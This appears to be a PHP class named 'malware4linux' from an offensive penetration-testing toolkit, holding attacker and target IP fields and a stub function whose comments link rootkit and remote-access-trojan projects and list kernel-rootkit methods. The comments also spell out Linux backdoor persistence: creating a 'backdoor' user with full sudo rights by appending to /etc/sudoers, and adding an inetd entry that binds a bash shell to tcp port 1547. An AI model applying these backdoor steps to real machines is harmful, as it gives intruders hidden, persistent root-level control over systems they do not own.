<?php

class malware4linux extends check4linux{
    var $target_ip ;
    var $target_port;
    var $attacker_ip ;
    var $attacker_port ;

	/*

	 * 
	 *  lscpu   : information sur l'architecture 
		time    : (/urs/bin/time ) obtenir un rapport d'exécution, 
        : temps de calculs et bien d'autres choses.
        : /usr/bin/time -a -o mesures.txt prog.exe
        
        
 In general, there are (currently) five different methods for manipulating the kernel being publicly discussed
Loadable kernel modules (UNIX) and device drivers (Windows)
2. Altering kernel in memory
3. Changing kernel file on hard drive
4. Virtualizing the system

       
  kernel mode rootkit altering live kernel in memory: SUCKit     
	 */


    
    
    
    
    public function __construct($target_ip,$target_port,$attacker_ip,$attacker_port,$file_path_output) {
        parent::__construct($file_path_output);
        $this->target_ip = trim($target_ip);
        $this->target_port = trim($target_port);
        $this->attacker_ip= trim($attacker_ip);
        $this->attacker_port= trim($attacker_port);
	}


	
	
	
	public function lan2root2rat(){

	    // https://github.com/n1nj4sec/pupy
	    // https://github.com/r00tkillah/HORSEPILL
	    // http://r00tkit.me/
	    // https://kalilinuxtutorials.com/cymothoa/
	    // https://blog.barradell-johns.com/index.php/2018/09/04/pinkys-palace-v3-writeup/
	    $result = "";
	    $result .= $this->ssTitre(__FUNCTION__);
	    /*
	     Backdooring Linux
	     + Adding a backdoor user (super visible to sysadmin)
	     Adding users
	     
	     /usr/sbin/adduser backdoor
	     passwd backdoor
	     echo "backdoor ALL=(ALL) ALL" >> /etc/sudoers
	     
	     Pick an obscure service from /etc/services associated with a tcp port 1024 and above...for example laplink
	     laplink         1547/tcp     # laplink
	     Add the following line to /etc/inetd.conf
	     laplink    stream  tcp     nowait  /bin/sh bash -i
	     restart inetd.conf
	     killall -HUP inetd
	     Explaination: You are creating a listener on port tcp/1547 that will shovel you a bash shell. Caveat: this obviously is not my *idea* It's just very VERY old stuff that still works.
	     
	     */
	    return $result ;
	}
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
}


?>